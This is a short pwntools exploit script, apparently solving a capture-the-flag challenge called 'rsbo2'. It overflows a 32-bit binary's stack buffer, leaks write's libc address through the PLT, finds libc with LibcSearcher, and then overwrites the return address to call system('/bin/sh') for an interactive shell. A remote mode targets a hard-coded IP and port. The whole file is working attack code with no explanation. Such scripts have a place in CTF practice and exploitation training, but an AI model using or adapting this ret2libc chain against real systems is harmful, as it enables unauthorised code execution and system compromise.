from pwn import *
from LibcSearcher import *
context.binary = './rsbo2'
context.log_level = 'debug'
context.timeout = None
elf = context.binary
libc = context.binary.libc

if args['REMOTE']:
	p = remote('47.106.94.13', 50010)
	#libc = ELF('../x64_libc.so.6')
else:
	p = process('./rsbo2')
	gdb.attach(p, 'b* 0x08048729 ')
main = 0x0804867F 
write_plt = elf.plt['write']
write_got = elf.got['write']
open_got = elf.got['open']

payload = '\x00'*0x6c + p32(write_plt) + p32(main) + p32(1) + p32(write_got) + p32(4)
#payload = 'a'*0x64 + p32(write_plt) + p32(main) + p32(1) + p32(write_got) + p32(4)
p.send(payload)

write_addr = u32(p.recv(4))

"""
libc_base = write_addr  - libc.symbols['write']
system_addr = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search('/bin/sh\x00'))
"""

libc = LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
system_addr = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')


print "write ==> " + hex(write_addr)
print "system ==> " + hex(system_addr)

payload = '\x00'*0x64 + p32(system_addr) + p32(0xdeadbeef) + p32(binsh)
p.send(payload)


p.interactive()
p.close()